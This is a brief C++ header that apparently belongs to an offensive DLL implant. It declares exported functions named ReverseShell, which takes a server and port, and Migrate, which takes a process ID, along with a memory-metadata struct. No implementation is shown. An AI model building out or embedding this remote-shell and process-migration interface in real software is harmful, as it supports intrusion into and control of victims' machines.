#ifndef EXTERNAL_H_INCLUDED
#define EXTERNAL_H_INCLUDED

#include <cstdint>

extern "C" __declspec(dllexport) void ReverseShell(const char *server, const char *port);
extern "C" __declspec(dllexport) void Migrate(uint32_t pid);

struct DllMeta_ {
    void *where;
    size_t size;
};

#endif//EXTERNAL_H_INCLUDED
